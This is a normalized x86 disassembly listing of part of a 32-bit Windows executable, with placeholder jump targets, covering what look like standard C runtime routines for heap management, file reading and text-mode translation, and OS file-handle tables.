lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_41a3c2
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_41a312
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_41aa90
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_42099e
test eax eax
je r-xdata
push 0xa
call sub_417457
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_4209ab
pop ecx
push 0x3
call sub_4171a5
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_412f80
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_41aba7
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_41abd7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_4119bb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_420bd9
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_41b3c1
pop ecx
push eax
call sub_41b2c4
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_41b3c1
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_41b3c1
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_41b3c1
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_41b3c1
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_41ad02
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_4119ce
and [ eax ] 0x0
call sub_4119bb
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_4119ce
mov [ eax ] ebx
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_4119ce
mov [ eax ] ebx
call sub_4119bb
mov [ eax ] 0x9
jmp r-xdata
call sub_4119ce
mov [ eax ] ebx
call sub_4119bb
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41897d
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_418672
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_42034c
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_4119bb
mov [ eax ] 0xc
call sub_4119ce
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_4119e1
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_4121b5
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_4119bb
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_42034c
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_42034c
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_42034c
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_41b2c4
push 0x10
push r--data
call sub_4183f0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_4119ce
and [ eax ] 0x0
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] esi
call sub_4119bb
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_418435
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_41b625
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_4119ce
mov [ eax ] esi
call sub_4119bb
mov [ eax ] 0x16
jmp r-xdata
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ad02
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b3b7
mov eax [ ebp - 0x1c ]
sub_41b3c1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_41b3f3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_4119bb
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_412f80
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_416940
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_4119bb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_41897d
add esp 0x14
mov eax esi
jmp r-xdata
sub_41b47f
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_417df1
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_41b4a7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_41b528
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_41b5ae
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_4119ce
and [ eax ] 0x0
call sub_4119bb
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_4119ce
mov [ eax ] esi
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_41b625
push 0xc
push r--data
call sub_4183f0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_418435
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b6bc
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_420b79
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_41b6c5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_41b6ec
push 0x18
push r--data
call sub_4183f0
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_419ed6
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b87d
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_418435
retn
push 0x40
push 0x20
call sub_4186b7
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_41b625
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_419f99
pop ecx
xor ebx ebx
inc ebx
